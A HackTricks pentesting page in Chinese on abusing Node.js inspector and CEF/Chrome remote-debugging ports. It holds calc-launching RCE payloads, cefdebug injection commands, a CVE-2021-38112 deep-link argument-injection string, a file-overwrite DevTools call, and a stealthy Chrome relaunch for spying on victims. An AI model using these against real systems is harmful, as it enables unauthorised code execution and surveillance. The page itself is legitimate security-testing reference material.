# Node inspector/CEF debug滥用

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！

- 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)

- **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **通过向[hacktricks仓库](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud仓库](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>

## 基本信息

当使用`--inspect`开关启动时，Node.js进程会监听一个调试客户端。**默认情况下**，它将监听主机和端口**`127.0.0.1:9229`**。每个进程还被分配一个**唯一的UUID**。

检查器客户端必须知道并指定主机地址、端口和UUID来连接。完整的URL看起来像`ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`。

{% hint style="warning" %}
由于**调试器具有对Node.js执行环境的完全访问权限**，能够连接到该端口的恶意行为者可能能够代表Node.js进程执行任意代码（**潜在的特权升级**）。
{% endhint %}

有几种启动检查器的方法：
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
当您启动一个被检查的进程时，会出现类似以下内容的信息：
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
基于**CEF**（**Chromium嵌入式框架**）的进程，需要使用参数`--remote-debugging-port=9222`来打开**调试器**（SSRF保护措施仍然非常相似）。然而，它们不会授予一个**NodeJS**的**debug**会话，而是使用[**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/)与浏览器进行通信，这是一个控制浏览器的接口，但没有直接的RCE。

当您启动一个被调试的浏览器时，会出现类似以下内容：
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### 浏览器、WebSockets和同源策略 <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

在Web浏览器中打开的网站可以在浏览器安全模型下进行WebSocket和HTTP请求。为了获得一个唯一的调试器会话ID，需要进行**初始的HTTP连接**。**同源策略**防止网站能够进行**此HTTP连接**。为了进一步防止[**DNS重绑定攻击**](https://en.wikipedia.org/wiki/DNS\_rebinding)**，**Node.js验证连接的**'Host'头部**是否明确指定了一个**IP地址**或**`localhost`**或**`localhost6`**。

{% hint style="info" %}
这些**安全措施防止利用检查器**通过**仅发送HTTP请求**（可以通过利用SSRF漏洞来完成）来运行代码。
{% endhint %}

### 在运行的进程中启动检查器

您可以向正在运行的Node.js进程发送**信号SIGUSR1**，以使其在默认端口上**启动检查器**。但是，请注意您需要具有足够的权限，因此这可能会为您提供对进程内部信息的**特权访问**，但不会直接提升权限。
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% hint style="info" %}
这在容器中非常有用，因为**关闭进程并启动新进程**使用`--inspect`是**不可行的**，因为该**容器**将随进程一起被**终止**。
{% endhint %}

### 连接到检查器/调试器

如果您可以访问**基于Chromium的浏览器**，可以通过访问`chrome://inspect`或`edge://inspect`来连接。单击配置按钮，确保您的**目标主机和端口**已列出（在下图中找到使用下一节示例之一获取RCE的示例）。

![](<../../.gitbook/assets/image (620) (1).png>)

使用**命令行**可以连接到调试器/检查器：
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
该工具[**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug)允许在本地**查找运行的检查器**并**注入代码**进入其中。
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
{% hint style="info" %}
请注意，如果通过[Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)连接到浏览器，**NodeJS RCE漏洞利用将不起作用**（您需要检查API以找到有趣的用法）。
{% endhint %}

## 在NodeJS调试器/检查器中的RCE

{% hint style="info" %}
如果您来到这里是为了了解如何从Electron中的XSS获取[RCE，请查看此页面。](../../network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps/)
{% endhint %}

当您可以连接到Node检查器时，一些常见的获得**RCE**的方法是使用类似以下内容（看起来这在连接到Chrome DevTools协议时**不起作用**）：
```javascript
process.mainModule.require('child_process').exec('calc')
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require('child_process').spawnSync('calc.exe')
Browser.open(JSON.stringify({url: "c:\\windows\\system32\\calc.exe"}))
```
## Chrome DevTools协议负载

您可以在此处查看API：[https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
在本节中，我将列出我发现人们用来利用此协议的有趣内容。

### 通过深链接进行参数注入

在[**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)中，Rhino Security发现基于CEF的应用程序在系统中注册了一个自定义URI（workspaces://），该URI接收完整的URI，然后使用部分从该URI构建的配置**启动CEF基于的应用程序**。

发现URI参数被URL解码并用于启动CEF基本应用程序，允许用户在**命令行**中**注入**标志**`--gpu-launcher`**并执行任意操作。

因此，一个负载如下所示：
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
将执行calc.exe。

### 覆盖文件

更改**下载文件保存的文件夹**，并下载一个文件来**覆盖**应用程序的经常使用的**源代码**，用你的**恶意代码**替换。
```javascript
ws = new WebSocket(url); //URL of the chrome devtools service
ws.send(JSON.stringify({
id: 42069,
method: 'Browser.setDownloadBehavior',
params: {
behavior: 'allow',
downloadPath: '/code/'
}
}));
```
### Webdriver RCE和数据泄露

根据这篇文章：[https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)，可以通过theriver获得RCE并泄露内部页面。

### 漏洞利用后

在真实环境中，在入侵了使用Chrome/Chromium浏览器的用户PC之后，您可以启动一个带有调试功能的Chrome进程，并将调试端口进行端口转发，以便您可以访问它。这样，您就能够检查受害者在Chrome中所做的一切，并窃取敏感信息。

隐蔽的方法是**终止所有Chrome进程**，然后调用类似以下的命令：
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## 参考资料

* [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s)
* [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
* [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
* [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
* [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
* [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
* [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- 你在一家**网络安全公司**工作吗？想要在 HackTricks 中**宣传你的公司**吗？或者你想要**获取最新版本的 PEASS 或下载 PDF 格式的 HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！

- 发现我们的独家 [**NFTs**](https://opensea.io/collection/the-peass-family) 集合——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)

- **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **通过向 [hacktricks 仓库](https://github.com/carlospolop/hacktricks) 和 [hacktricks-cloud 仓库](https://github.com/carlospolop/hacktricks-cloud) 提交 PR 来分享你的黑客技巧**。

</details>
